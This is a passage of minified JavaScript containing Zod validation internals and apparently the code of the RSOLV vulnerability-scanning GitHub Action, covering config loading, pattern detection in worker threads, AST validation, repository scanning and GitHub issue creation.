options(){return this._def.values}get enum(){let X={};for(let J of this._def.values)X[J]=J;return X}get Values(){let X={};for(let J of this._def.values)X[J]=J;return X}get Enum(){let X={};for(let J of this._def.values)X[J]=J;return X}extract(X,J=this._def){return t6.create(X,{...this._def,...J})}exclude(X,J=this._def){return t6.create(this.options.filter((Q)=>!X.includes(Q)),{...this._def,...J})}}t6.create=rH;class w8 extends c1{_parse(X){let J=i1.getValidEnumValues(this._def.values),Q=this._getOrReturnCtx(X);if(Q.parsedType!==Q1.string&&Q.parsedType!==Q1.number){let Y=i1.objectValues(J);return H1(Q,{expected:i1.joinValues(Y),received:Q.parsedType,code:o.invalid_type}),P1}if(!this._cache)this._cache=new Set(i1.getValidEnumValues(this._def.values));if(!this._cache.has(X.data)){let Y=i1.objectValues(J);return H1(Q,{received:Q.data,code:o.invalid_enum_value,options:Y}),P1}return c0(X.data)}get enum(){return this._def.values}}w8.create=(X,J)=>{return new w8({values:X,typeName:T1.ZodNativeEnum,...x1(J)})};class CX extends c1{unwrap(){return this._def.type}_parse(X){let{ctx:J}=this._processInputParams(X);if(J.parsedType!==Q1.promise&&J.common.async===!1)return H1(J,{code:o.invalid_type,expected:Q1.promise,received:J.parsedType}),P1;let Q=J.parsedType===Q1.promise?J.data:Promise.resolve(J.data);return c0(Q.then((Y)=>{return this._def.type.parseAsync(Y,{path:J.path,errorMap:J.common.contextualErrorMap})}))}}CX.create=(X,J)=>{return new CX({type:X,typeName:T1.ZodPromise,...x1(J)})};class g9 extends c1{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===T1.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(X){let{status:J,ctx:Q}=this._processInputParams(X),Y=this._def.effect||null,W={addIssue:(G)=>{if(H1(Q,G),G.fatal)J.abort();else J.dirty()},get path(){return Q.path}};if(W.addIssue=W.addIssue.bind(W),Y.type==="preprocess"){let G=Y.transform(Q.data,W);if(Q.common.async)return Promise.resolve(G).then(async(H)=>{if(J.value==="aborted")return P1;let z=await this._def.schema._parseAsync({data:H,path:Q.path,parent:Q});if(z.status==="aborted")return P1;if(z.status==="dirty")return wX(z.value);if(J.value==="dirty")return wX(z.value);return z});else{if(J.value==="aborted")return P1;let H=this._def.schema._parseSync({data:G,path:Q.path,parent:Q});if(H.status==="aborted")return P1;if(H.status==="dirty")return wX(H.value);if(J.value==="dirty")return wX(H.value);return H}}if(Y.type==="refinement"){let G=(H)=>{let z=Y.refinement(H,W);if(Q.common.async)return Promise.resolve(z);if(z instanceof Promise)throw Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return H};if(Q.common.async===!1){let H=this._def.schema._parseSync({data:Q.data,path:Q.path,parent:Q});if(H.status==="aborted")return P1;if(H.status==="dirty")J.dirty();return G(H.value),{status:J.value,value:H.value}}else return this._def.schema._parseAsync({data:Q.data,path:Q.path,parent:Q}).then((H)=>{if(H.status==="aborted")return P1;if(H.status==="dirty")J.dirty();return G(H.value).then(()=>{return{status:J.value,value:H.value}})})}if(Y.type==="transform")if(Q.common.async===!1){let G=this._def.schema._parseSync({data:Q.data,path:Q.path,parent:Q});if(!a6(G))return P1;let H=Y.transform(G.value,W);if(H instanceof Promise)throw Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:J.value,value:H}}else return this._def.schema._parseAsync({data:Q.data,path:Q.path,parent:Q}).then((G)=>{if(!a6(G))return P1;return Promise.resolve(Y.transform(G.value,W)).then((H)=>({status:J.value,value:H}))});i1.assertNever(Y)}}g9.create=(X,J,Q)=>{return new g9({schema:X,typeName:T1.ZodEffects,effect:J,...x1(Q)})};g9.createWithPreprocess=(X,J,Q)=>{return new g9({schema:J,effect:{type:"preprocess",transform:X},typeName:T1.ZodEffects,...x1(Q)})};class h9 extends c1{_parse(X){if(this._getType(X)===Q1.undefined)return c0(void 0);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}}h9.create=(X,J)=>{return new h9({innerType:X,typeName:T1.ZodOptional,...x1(J)})};class N6 extends c1{_parse(X){if(this._getType(X)===Q1.null)return c0(null);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}}N6.create=(X,J)=>{return new N6({innerType:X,typeName:T1.ZodNullable,...x1(J)})};class N8 extends c1{_parse(X){let{ctx:J}=this._processInputParams(X),Q=J.data;if(J.parsedType===Q1.undefined)Q=this._def.defaultValue();return this._def.innerType._parse({data:Q,path:J.path,parent:J})}removeDefault(){return this._def.innerType}}N8.create=(X,J)=>{return new N8({innerType:X,typeName:T1.ZodDefault,defaultValue:typeof J.default==="function"?J.default:()=>J.default,...x1(J)})};class L8 extends c1{_parse(X){let{ctx:J}=this._processInputParams(X),Q={...J,common:{...J.common,issues:[]}},Y=this._def.innerType._parse({data:Q.data,path:Q.path,parent:{...Q}});if(Z8(Y))return Y.then((W)=>{return{status:"valid",value:W.status==="valid"?W.value:this._def.catchValue({get error(){return new H9(Q.common.issues)},input:Q.data})}});else return{status:"valid",value:Y.status==="valid"?Y.value:this._def.catchValue({get error(){return new H9(Q.common.issues)},input:Q.data})}}removeCatch(){return this._def.innerType}}L8.create=(X,J)=>{return new L8({innerType:X,typeName:T1.ZodCatch,catchValue:typeof J.catch==="function"?J.catch:()=>J.catch,...x1(J)})};class EJ extends c1{_parse(X){if(this._getType(X)!==Q1.nan){let Q=this._getOrReturnCtx(X);return H1(Q,{code:o.invalid_type,expected:Q1.nan,received:Q.parsedType}),P1}return{status:"valid",value:X.data}}}EJ.create=(X)=>{return new EJ({typeName:T1.ZodNaN,...x1(X)})};var cL=Symbol("zod_brand");class q5 extends c1{_parse(X){let{ctx:J}=this._processInputParams(X),Q=J.data;return this._def.type._parse({data:Q,path:J.path,parent:J})}unwrap(){return this._def.type}}class kJ extends c1{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.common.async)return(async()=>{let W=await this._def.in._parseAsync({data:Q.data,path:Q.path,parent:Q});if(W.status==="aborted")return P1;if(W.status==="dirty")return J.dirty(),wX(W.value);else return this._def.out._parseAsync({data:W.value,path:Q.path,parent:Q})})();else{let Y=this._def.in._parseSync({data:Q.data,path:Q.path,parent:Q});if(Y.status==="aborted")return P1;if(Y.status==="dirty")return J.dirty(),{status:"dirty",value:Y.value};else return this._def.out._parseSync({data:Y.value,path:Q.path,parent:Q})}}static create(X,J){return new kJ({in:X,out:J,typeName:T1.ZodPipeline})}}class I8 extends c1{_parse(X){let J=this._def.innerType._parse(X),Q=(Y)=>{if(a6(Y))Y.value=Object.freeze(Y.value);return Y};return Z8(J)?J.then((Y)=>Q(Y)):Q(J)}unwrap(){return this._def.innerType}}I8.create=(X,J)=>{return new I8({innerType:X,typeName:T1.ZodReadonly,...x1(J)})};function lH(X,J){let Q=typeof X==="function"?X(J):typeof X==="string"?{message:X}:X;return typeof Q==="string"?{message:Q}:Q}function aH(X,J={},Q){if(X)return LX.create().superRefine((Y,W)=>{let G=X(Y);if(G instanceof Promise)return G.then((H)=>{if(!H){let z=lH(J,Y),$=z.fatal??Q??!0;W.addIssue({code:"custom",...z,fatal:$})}});if(!G){let H=lH(J,Y),z=H.fatal??Q??!0;W.addIssue({code:"custom",...H,fatal:z})}return});return LX.create()}var lL={object:O0.lazycreate},T1;(function(X){X.ZodString="ZodString",X.ZodNumber="ZodNumber",X.ZodNaN="ZodNaN",X.ZodBigInt="ZodBigInt",X.ZodBoolean="ZodBoolean",X.ZodDate="ZodDate",X.ZodSymbol="ZodSymbol",X.ZodUndefined="ZodUndefined",X.ZodNull="ZodNull",X.ZodAny="ZodAny",X.ZodUnknown="ZodUnknown",X.ZodNever="ZodNever",X.ZodVoid="ZodVoid",X.ZodArray="ZodArray",X.ZodObject="ZodObject",X.ZodUnion="ZodUnion",X.ZodDiscriminatedUnion="ZodDiscriminatedUnion",X.ZodIntersection="ZodIntersection",X.ZodTuple="ZodTuple",X.ZodRecord="ZodRecord",X.ZodMap="ZodMap",X.ZodSet="ZodSet",X.ZodFunction="ZodFunction",X.ZodLazy="ZodLazy",X.ZodLiteral="ZodLiteral",X.ZodEnum="ZodEnum",X.ZodEffects="ZodEffects",X.ZodNativeEnum="ZodNativeEnum",X.ZodOptional="ZodOptional",X.ZodNullable="ZodNullable",X.ZodDefault="ZodDefault",X.ZodCatch="ZodCatch",X.ZodPromise="ZodPromise",X.ZodBranded="ZodBranded",X.ZodPipeline="ZodPipeline",X.ZodReadonly="ZodReadonly"})(T1||(T1={}));var pL=(X,J={message:`Input not instance of ${X.name}`})=>aH((Q)=>Q instanceof X,J),nH=f9.create,sH=s6.create,dL=EJ.create,iL=o6.create,oH=M8.create,rL=NX.create,aL=PJ.create,nL=j8.create,sL=O8.create,oL=LX.create,tL=n6.create,eL=Q6.create,XI=SJ.create,JI=x9.create,QI=O0.create,YI=O0.strictCreate,WI=F8.create,GI=Z5.create,HI=R8.create,zI=Y6.create,$I=TJ.create,VI=_J.create,KI=IX.create,UI=B8.create,ZI=A8.create,qI=D8.create,BI=t6.create,MI=w8.create,jI=CX.create,OI=g9.create,FI=h9.create,RI=N6.create,AI=g9.createWithPreprocess,DI=kJ.create,wI=()=>nH().optional(),NI=()=>sH().optional(),LI=()=>oH().optional(),II={string:(X)=>f9.create({...X,coerce:!0}),number:(X)=>s6.create({...X,coerce:!0}),boolean:(X)=>M8.create({...X,coerce:!0}),bigint:(X)=>o6.create({...X,coerce:!0}),date:(X)=>NX.create({...X,coerce:!0})};var CI=P1;I1();var PI=V1.object({provider:V1.string(),providerApiKey:V1.string().optional(),model:V1.string(),baseUrl:V1.string().optional(),maxTokens:V1.number().optional(),temperature:V1.number().optional(),contextLimit:V1.number().optional(),timeout:V1.number().optional(),useVendedCredentials:V1.boolean().optional()}),SI=V1.object({enabled:V1.boolean(),image:V1.string().optional(),memoryLimit:V1.string().optional(),cpuLimit:V1.string().optional(),timeout:V1.number().optional(),securityProfile:V1.enum(["default","strict","relaxed"]).optional(),environmentVariables:V1.record(V1.string(),V1.string()).optional()}),TI=V1.object({disableNetworkAccess:V1.boolean().optional(),allowedDomains:V1.array(V1.string()).optional(),scanDependencies:V1.boolean().optional(),preventSecretLeakage:V1.boolean().optional(),maxFileSize:V1.number().optional(),timeoutSeconds:V1.number().optional(),requireCodeReview:V1.boolean().optional()}),_I=V1.object({enabled:V1.boolean().optional(),generateForVulnerabilities:V1.boolean().optional(),includeInPR:V1.boolean().optional(),validateFixes:V1.boolean().optional(),languages:V1.array(V1.string()).optional(),frameworks:V1.record(V1.string(),V1.array(V1.string())).optional()}),EI=V1.object({enabled:V1.boolean().optional(),maxIterations:V1.number().optional(),maxIterationsByType:V1.record(V1.string(),V1.number()).optional(),maxIterationsByTier:V1.record(V1.string(),V1.number()).optional()}),kI=V1.object({rsolvApiKey:V1.string(),configPath:V1.string(),issueLabel:V1.string(),scanLabel:V1.string().optional(),enableSecurityAnalysis:V1.boolean().optional(),environmentVariables:V1.record(V1.string(),V1.string()).optional(),repoToken:V1.string().optional(),aiProvider:PI,containerConfig:SI,securitySettings:TI,maxIssues:V1.number().min(1).optional(),useGitBasedEditing:V1.boolean().optional(),useStructuredPhases:V1.boolean().optional(),testGeneration:_I.optional(),fixValidation:EI.optional(),executableTests:V1.boolean().optional(),claudeMaxTurns:V1.number().min(1).max(20).optional()});async function tH(){try{U.info("Loading configuration");let X=bI(),J=process.env.RSOLV_CONFIG_PATH||".github/rsolv.yml",Q=await vI(J),Y=fI(),W={...X,...Q,...Y,aiProvider:{...X.aiProvider,...Q.aiProvider,...Y.aiProvider},containerConfig:{...X.containerConfig,...Q.containerConfig,...Y.containerConfig},securitySettings:{...X.securitySettings,...Q.securitySettings,...Y.securitySettings}},G=xI(W);if(G.aiProvider.useVendedCredentials&&G.rsolvApiKey)process.env.RSOLV_API_KEY=G.rsolvApiKey,U.info("Set RSOLV_API_KEY environment variable for vended credentials (config loader)");return U.debug("Configuration loaded successfully"),U.info(`Final config - rsolvApiKey: ${G.rsolvApiKey?"present":"not set"}`),G}catch(X){throw U.error("Failed to load configuration",X),Error(`Configuration error: ${X instanceof Error?X.message:String(X)}`)}}function bI(){return{configPath:".github/rsolv.yml",issueLabel:"rsolv:automate",scanLabel:"rsolv:detected",enableSecurityAnalysis:!0,maxIssues:void 0,useGitBasedEditing:!0,useStructuredPhases:!0,aiProvider:{provider:"claude-code",model:"claude-sonnet-4-5-20250929",temperature:0.2,contextLimit:1e5,timeout:3600000,useVendedCredentials:!0},containerConfig:{enabled:!0,image:"rsolv/code-analysis:latest",memoryLimit:"2g",cpuLimit:"1",timeout:300,securityProfile:"default"},securitySettings:{disableNetworkAccess:!0,scanDependencies:!0,preventSecretLeakage:!0,maxFileSize:1048576,timeoutSeconds:300,requireCodeReview:!0},testGeneration:{enabled:process.env.ENABLE_TEST_GENERATION==="true",generateForVulnerabilities:!0,includeInPR:!0,validateFixes:process.env.ENABLE_FIX_VALIDATION==="true",languages:process.env.TEST_GEN_LANGUAGES?.split(",")||["javascript","typescript"],frameworks:{javascript:["jest","mocha","vitest"],typescript:["jest","mocha","vitest"],python:["pytest","unittest"],ruby:["rspec","minitest"],php:["phpunit","pest"],java:["junit5","testng"]}},fixValidation:{enabled:(()=>{let X=process.env.DISABLE_FIX_VALIDATION,J=X==="true";return console.log(`[CONFIG DEBUG] DISABLE_FIX_VALIDATION env: "${X}"`),console.log(`[CONFIG DEBUG] Setting fixValidation.enabled to: ${!J}`),!J})(),maxIterations:3,maxIterationsByType:{},maxIterationsByTier:{}},executableTests:process.env.RSOLV_EXECUTABLE_TESTS!=="false",claudeMaxTurns:5}}async function vI(X){try{if(!M5.existsSync(X))return U.info(`Configuration file not found at ${X}, using defaults`),{};U.info(`Loading configuration from ${X}`);let J=M5.readFileSync(X,"utf8"),Q=mH(J);return U.debug("Configuration file loaded successfully"),Q||{}}catch(J){return U.error(`Error loading configuration from file ${X}`,J),{}}}function fI(){U.info("Loading configuration from environment variables");let X=process.env.RSOLV_API_KEY||process.env.INPUT_API_KEY||process.env.INPUT_RSOLVAPI_KEY||process.env.INPUT_RSOLVAPIKEY;U.info(`Environment RSOLV_API_KEY: ${X?"present":"not set"}`);let J={rsolvApiKey:X,configPath:process.env.RSOLV_CONFIG_PATH||process.env.INPUT_CONFIG_PATH,issueLabel:process.env.RSOLV_ISSUE_LABEL||process.env.INPUT_ISSUE_LABEL,repoToken:process.env.GITHUB_TOKEN};if(process.env.RSOLV_MAX_ISSUES){let Q=parseInt(process.env.RSOLV_MAX_ISSUES,10);if(!isNaN(Q))J.maxIssues=Q}if(process.env.RSOLV_USE_GIT_BASED_EDITING!==void 0)J.useGitBasedEditing=process.env.RSOLV_USE_GIT_BASED_EDITING==="true";else J.useGitBasedEditing=!0;if(process.env.RSOLV_USE_STRUCTURED_PHASES!==void 0)J.useStructuredPhases=process.env.RSOLV_USE_STRUCTURED_PHASES==="true";else J.useStructuredPhases=!0;if(process.env.RSOLV_EXECUTABLE_TESTS!==void 0)J.executableTests=process.env.RSOLV_EXECUTABLE_TESTS==="true";if(process.env.RSOLV_CLAUDE_MAX_TURNS){let Q=parseInt(process.env.RSOLV_CLAUDE_MAX_TURNS,10);if(!isNaN(Q)&&Q>=1&&Q<=20)J.claudeMaxTurns=Q;else U.warn(`Invalid RSOLV_CLAUDE_MAX_TURNS value: ${process.env.RSOLV_CLAUDE_MAX_TURNS}. Must be between 1 and 20. Using default: 5`)}if(process.env.RSOLV_ENVIRONMENT_VARIABLES)try{J.environmentVariables=JSON.parse(process.env.RSOLV_ENVIRONMENT_VARIABLES)}catch(Q){U.error("Error parsing RSOLV_ENVIRONMENT_VARIABLES",Q)}if(process.env.RSOLV_AI_PROVIDER){let Q=process.env.RSOLV_AI_API_KEY;if(J.aiProvider={provider:process.env.RSOLV_AI_PROVIDER,providerApiKey:Q,model:process.env.RSOLV_AI_MODEL||"claude-sonnet-4-5-20250929",baseUrl:process.env.RSOLV_AI_BASE_URL,useVendedCredentials:process.env.RSOLV_USE_VENDED_CREDENTIALS!==void 0?process.env.RSOLV_USE_VENDED_CREDENTIALS==="true":!0},process.env.RSOLV_AI_TEMPERATURE)J.aiProvider.temperature=parseFloat(process.env.RSOLV_AI_TEMPERATURE);if(process.env.RSOLV_AI_MAX_TOKENS)J.aiProvider.maxTokens=parseInt(process.env.RSOLV_AI_MAX_TOKENS,10)}if(process.env.RSOLV_CONTAINER_ENABLED!==void 0){if(J.containerConfig={enabled:process.env.RSOLV_CONTAINER_ENABLED==="true",image:process.env.RSOLV_CONTAINER_IMAGE,memoryLimit:process.env.RSOLV_CONTAINER_MEMORY_LIMIT,cpuLimit:process.env.RSOLV_CONTAINER_CPU_LIMIT},process.env.RSOLV_CONTAINER_TIMEOUT)J.containerConfig.timeout=parseInt(process.env.RSOLV_CONTAINER_TIMEOUT,10)}return Object.keys(J).forEach((Q)=>{if(J[Q]===void 0)delete J[Q]}),J}function xI(X){U.debug("Validating configuration");try{if(!X.rsolvApiKey)throw Error("RSOLV API key is required (rsolvApiKey)");let J=kI.parse(X);return U.debug("Configuration validation successful"),J}catch(J){if(J instanceof V1.ZodError){let Q=J.errors.map((Y)=>`${Y.path.join(".")}: ${Y.message}`).join(", ");throw U.error(`Configuration validation failed: ${Q}`),Error(`Invalid configuration: ${Q}`)}throw J}}I1();z9();var bC=["scan","validate","mitigate","full","validate-only","validate-and-fix","fix-only"];function vC(){let X=process.argv.slice(2);for(let J=0;J<X.length;J++){let Q=X[J];if(Q.startsWith("--mode="))return Q.substring(7);if(Q==="--mode"&&J+1<X.length)return X[J+1]}return}function iz(){let X=vC();if(X){let Y=X.toLowerCase();if(dz(Y))return Y}let J=process.env.RSOLV_MODE||process.env.INPUT_MODE;if(J){let Y=J.toLowerCase();if(dz(Y))return Y}let Q=process.env.RSOLV_SCAN_MODE;if(Q&&Q.toLowerCase()==="scan")return"scan";return"full"}function dz(X){return bC.includes(X)}function rz(X){switch(X){case"scan":return"Scan for vulnerabilities and create issues";case"validate":case"validate-only":return"Validate vulnerabilities with failing tests";case"mitigate":case"fix-only":return"Fix validated vulnerabilities";case"validate-and-fix":return"Validate and fix vulnerabilities for specific issues";case"full":return"Run all phases: scan, validate, and mitigate";default:return"Unknown mode"}}I1();k8();var dF=z0(D$(),1);import{Worker as jv1}from"worker_threads";import*as x4 from"path";import{fileURLToPath as Ov1}from"url";var Fv1=Ov1(import.meta.url),Rv1=x4.dirname(Fv1);class R3{patternSource;skippedPatterns=new Set;lastError=null;activeWorkers=new Set;lastWorkerTerminated=!1;defaultTimeout=30000;constructor(X){this.patternSource=X||C6()}async detect(X,J,Q){if(!X||typeof X!=="string")return this.lastError=Error("Invalid code input"),U.error("SafeDetector: Invalid code input"),[];try{let Y=await this.patternSource.getPatternsByLanguage(J);return U.info(`SafeDetector: Analyzing ${J} code with ${Y.length} patterns`),U.info(`SafeDetector: Running all ${Y.length} patterns in worker thread for safety`),await this.runPatternsInWorker(X,J,Y,Q,this.defaultTimeout)}catch(Y){return this.lastError=Y,U.error("SafeDetector error:",Y),[]}}async detectWithPattern(X,J,Q,Y){let W=[Q],{safe:G,unsafe:H}=this.filterPatterns(W);if(H.length>0)return this.runPatternsInWorker(X,J,H,"test.file",Y||this.defaultTimeout);else if(G.length>0)return this.runPatternsInMainThread(X,J,G,"test.file");return[]}filterPatterns(X){let J=[],Q=[];for(let Y of X){let W=!0;if(Y.patterns?.regex){for(let G of Y.patterns.regex)if(!dF.default(G,{limit:25})){W=!1,this.skippedPatterns.add(Y.id),U.warn(`SafeDetector: Pattern ${Y.id} marked as potentially unsafe`);break}}if(W)J.push(Y);else Q.push(Y)}return{safe:J,unsafe:Q}}async runPatternsInMainThread(X,J,Q,Y){let{SecurityDetectorV2:W}=await Promise.resolve().then(() => (P7(),pF)),G=new W,H={getPatternsByLanguage:async()=>Q};return G.patternSource=H,G.detect(X,J,Y||"unknown")}async runPatternsInWorker(X,J,Q,Y,W=30000){if(Q.length===0)return[];return new Promise((G)=>{let H=x4.join(Rv1,"detector-worker.js"),z=new jv1(H,{workerData:{code:X,language:J,patterns:Q,filePath:Y||"unknown"}});this.activeWorkers.add(z),this.lastWorkerTerminated=!1;let $=setTimeout(()=>{U.warn(`SafeDetector: Worker timeout after ${W}ms for ${Y||"unknown"}`),this.lastWorkerTerminated=!0,z.terminate(),this.activeWorkers.delete(z),G([])},W);z.on("message",(V)=>{if(clearTimeout($),this.activeWorkers.delete(z),V.type==="result")G(V.data||[]);else U.error(`SafeDetector: Worker error: ${V.error}`),this.lastError=Error(V.error),G([]);z.terminate()}),z.on("error",(V)=>{clearTimeout($),this.activeWorkers.delete(z),U.error("SafeDetector: Worker error:",V),this.lastError=V,G([])}),z.on("exit",(V)=>{if(clearTimeout($),this.activeWorkers.delete(z),V!==0&&!this.lastWorkerTerminated)U.error(`SafeDetector: Worker exited with code ${V}`)})})}getSkippedPatterns(){return Array.from(this.skippedPatterns)}getLastError(){return this.lastError}getWorkerCount(){return this.activeWorkers.size}getLastWorkerTerminated(){return this.lastWorkerTerminated}cleanup(){for(let X of this.activeWorkers)X.terminate();this.activeWorkers.clear()}}z9();I1();k8();I1();class A3{apiClient;cache=new Map;constructor(X){this.apiClient=new x6({apiKey:X,baseUrl:process.env.RSOLV_API_URL||"https://api.rsolv.dev"})}async validateVulnerabilities(X,J){if(X.length===0)return[];U.info(`Validating ${X.length} vulnerabilities with AST analysis`);try{let Q=this.prepareValidationRequest(X,J),Y=await this.callValidationAPI(Q);return this.processValidationResponse(X,Y)}catch(Q){return U.warn("AST validation failed, using all vulnerabilities",{error:Q instanceof Error?Q.message:Q,stack:Q instanceof Error?Q.stack:void 0}),X}}prepareValidationRequest(X,J){let Q=X.map((W)=>({id:`${W.type}-${W.line}-${W.column||0}`,type:W.type,patternId:W.type,filePath:W.filePath||"",line:W.line,code:W.snippet||"",severity:W.severity})),Y={};for(let[W,G]of J)Y[W]={content:G};return{vulnerabilities:Q,files:Y}}async callValidationAPI(X){let J=await this.apiClient.validateVulnerabilities(X);if(process.env.DEBUG_AST_VALIDATION)console.log("AST Validation Request:",JSON.stringify(X,null,2)),console.log("AST Validation Response:",JSON.stringify(J,null,2));return J}processValidationResponse(X,J){let Q=new Map(J.validated.map((W)=>[W.id,W])),Y=X.filter((W)=>{let G=`${W.type}-${W.line}-${W.column||0}`,H=Q.get(G);if(!H)return!0;if(!H.isValid)return U.debug(`Filtered false positive: ${W.filePath}:${W.line} - ${H.reason}`),!1;return!0});return U.info(`AST validation complete: ${J.stats.rejected} false positives filtered out`),Y}getCacheKey(X,J,Q){return`${X}:${J}:${Q}`}}S7();class w3{detector;github;vendorDetector;constructor(){this.detector=new R3(C6()),this.github=Z0(),this.vendorDetector=new ZX}async scan(X){U.info(`Starting vulnerability scan for ${X.repository.owner}/${X.repository.name}`);let J=Date.now(),Q=await this.getRepositoryFiles(X),Y=[];U.info(`Found ${Q.length} files to scan`),U.info(`Starting vulnerability detection on ${Q.length} files...`);for(let H=0;H<Q.length;H++){let z=Q[H];if(H===0||H===Q.length-1||(H+1)%10===0)U.info(`Scanning progress: ${H+1}/${Q.length} files (${z.path})`);if(z.language&&this.isSupportedLanguage(z.language))try{if(await this.vendorDetector.isVendorFile(z.path)){U.info(`Skipping vendor/minified file: ${z.path}`);continue}let V=await this.detector.detect(z.content,z.language,z.path);if(V.forEach((K)=>{K.filePath=z.path,K.isVendor=!1}),Y.push(...V),V.length>0)U.info(`Found ${V.length} vulnerabilities in ${z.path}`)}catch($){U.error(`Error scanning file ${z.path}:`,$)}}if(U.info(`Scanning complete. Total vulnerabilities found: ${Y.length}`),X.enableASTValidation!==!1&&X.rsolvApiKey&&typeof X.rsolvApiKey==="string"&&X.rsolvApiKey.length>0){U.info("Performing AST validation on detected vulnerabilities (enabled by default)...");let H=new A3(X.rsolvApiKey),z=new Map;Q.forEach((K)=>z.set(K.path,K.content));let $=Y.length;Y=await H.validateVulnerabilities(Y,z);let V=$-Y.length;U.info(`AST validation complete: ${V} false positives filtered out`)}else if(X.enableASTValidation!==!1)U.warn("AST validation is enabled but skipped - missing RSOLV API key");U.info("Scanned application code only (vendor/minified files automatically excluded)");let W=this.groupVulnerabilities(Y),G=Date.now()-J;return U.info(`Scan completed in ${G}ms. Found ${Y.length} vulnerabilities`),this.detector.cleanup(),{repository:`${X.repository.owner}/${X.repository.name}`,branch:X.repository.defaultBranch,scanDate:new Date().toISOString(),totalFiles:Q.length,scannedFiles:Q.filter((H)=>H.language&&this.isSupportedLanguage(H.language)).length,vulnerabilities:Y,groupedVulnerabilities:W,createdIssues:[]}}async getRepositoryFiles(X){let J=[];try{let{data:Q}=await this.github.git.getTree({owner:X.repository.owner,repo:X.repository.name,tree_sha:X.repository.defaultBranch,recursive:"1"}),Y=Q.tree.filter((W)=>W.type==="blob"&&W.path&&this.isCodeFile(W.path)&&W.size&&W.size<1e6);U.info(`Fetching content for ${Y.length} code files...`);for(let W=0;W<Y.length;W++){let G=Y[W];if(!G.path||!G.sha)continue;if(W===0||W===Y.length-1||(W+1)%10===0)U.info(`Progress: ${W+1}/${Y.length} files fetched (${G.path})`);try{let{data:H}=await this.github.git.getBlob({owner:X.repository.owner,repo:X.repository.name,file_sha:G.sha}),z=Buffer.from(H.content,"base64").toString("utf-8"),$=this.detectLanguage(G.path);if($)J.push({path:G.path,content:z,language:$})}catch(H){U.error(`Error fetching content for ${G.path}:`,H)}}U.info(`Completed fetching ${J.length} files with supported languages`)}catch(Q){throw U.error("Error getting repository files:",Q),Q}return J}isCodeFile(X){return[".js",".jsx",".ts",".tsx",".mjs",".cjs",".py",".pyw",".rb",".rake",".java",".php",".phtml",".ex",".exs"].some((Q)=>X.endsWith(Q))}detectLanguage(X){let J={".js":"javascript",".jsx":"javascript",".ts":"typescript",".tsx":"typescript",".mjs":"javascript",".cjs":"javascript",".py":"python",".pyw":"python",".rb":"ruby",".rake":"ruby",".java":"java",".php":"php",".phtml":"php",".ex":"elixir",".exs":"elixir"},Q=X.substring(X.lastIndexOf("."));return J[Q]||null}isSupportedLanguage(X){return["javascript","typescript","python","ruby","java","php","elixir"].includes(X.toLowerCase())}groupVulnerabilities(X){let J=new Map;for(let Q of X){let Y=`${Q.type}-${Q.severity}`;if(!J.has(Y))J.set(Y,{type:Q.type,severity:Q.severity,count:0,files:[],vulnerabilities:[],isVendor:!1});let W=J.get(Y);if(W.count++,W.vulnerabilities.push(Q),Q.filePath&&!W.files.includes(Q.filePath))W.files.push(Q.filePath)}return Array.from(J.values()).sort((Q,Y)=>{let W={high:0,medium:1,low:2},G=W[Q.severity]-W[Y.severity];return G!==0?G:Y.count-Q.count})}}z9();I1();class N3{github;constructor(){this.github=Z0()}async createIssuesFromGroups(X,J){let Q=[];if(!J.createIssues)return U.info("Issue creation disabled, skipping"),Q;let Y=X.filter(($)=>$.isVendor),W=X.filter(($)=>!$.isVendor);U.info(`Found ${W.length} application vulnerability groups and ${Y.length} vendor vulnerability groups`);let G=W,H=J.maxIssues,z=H?G.slice(0,H):G;if(U.info(`Processing ${z.length} application vulnerability groups`+(H?` (limited by max_issues: ${H})`:"")),H&&G.length>H)U.info(`Note: ${G.length-H} vulnerability groups will be skipped due to max_issues limit`);if(Y.length>0){U.info(`Skipping ${Y.length} vendor vulnerability groups (require library updates, not code patches)`);for(let $ of Y)U.info(`  - ${$.type} in ${$.files.length} vendor files (${$.count} instances)`)}for(let $ of z)try{let V=await this.findExistingIssue($,J);if(V){U.info(`Found existing issue #${V.number} for ${$.type} vulnerabilities`);let K=await this.updateExistingIssue(V,$,J);Q.push(K)}else{let K=await this.createIssueForGroup($,J);Q.push(K),U.info(`Created new issue #${K.number} for ${$.type} vulnerabilities`)}}catch(V){U.error(`Failed to process issue for ${$.type}:`,V)}return Q}async findExistingIssue(X,J){try{if(process.env.RSOLV_TESTING_MODE==="true"&&process.env.RSOLV_FORCE_FRESH_ISSUES==="true")return U.info("Test mode: Force fresh issues enabled, skipping existing issue check"),null;let Q=`rsolv:vuln-${X.type}`,{data:Y}=await this.github.issues.listForRepo({owner:J.repository.owner,repo:J.repository.name,labels:Q,state:"open"});return Y.length>0?Y[0]:null}catch(Q){return U.warn(`Failed to check for existing issues: ${Q}`),null}}async updateExistingIssue(X,J,Q){let Y=this.generateIssueTitle(J),W=this.generateIssueBody(J,Q);await this.github.issues.update({owner:Q.repository.owner,repo:Q.repository.name,issue_number:X.number,title:Y,body:W});let G=this.generateUpdateComment(J,X);return await this.github.issues.createComment({owner:Q.repository.owner,repo:Q.repository.name,issue_number:X.number,body:G}),{number:X.number,title:Y,url:X.html_url,vulnerabilityType:J.type,fileCount:J.files.length}}generateUpdateComment(X,J){return`## \uD83D\uDCCA Scan Update - ${new Date().toISOString()}

**Updated vulnerability count**: ${X.count} instances in ${X.files.length} files

This issue has been updated with the latest scan results. The vulnerability details above reflect the current state of the codebase.`}async createIssueForGroup(X,J){let Q=this.generateIssueTitle(X),Y=this.generateIssueBody(X,J),W=["rsolv:detected",`rsolv:vuln-${X.type}`,"security",X.severity,"automated-scan"];if(process.env.RSOLV_DEMO_MODE==="true"||process.env.RSOLV_AUTO_FIX==="true")W.push("rsolv:automate"),W.push("demo");let{data:G}=await this.github.issues.create({owner:J.repository.owner,repo:J.repository.name,title:Q,body:Y,labels:W});return{number:G.number,title:G.title,url:G.html_url,vulnerabilityType:X.type,fileCount:X.files.length}}generateIssueTitle(X){let J={"sql-injection":"SQL Injection",xss:"Cross-Site Scripting (XSS)","command-injection":"Command Injection","path-traversal":"Path Traversal","weak-crypto":"Weak Cryptography","hardcoded-secret":"Hardcoded Secrets","insecure-random":"Insecure Random Number Generation","open-redirect":"Open Redirect",xxe:"XML External Entity (XXE)",ssrf:"Server-Side Request Forgery 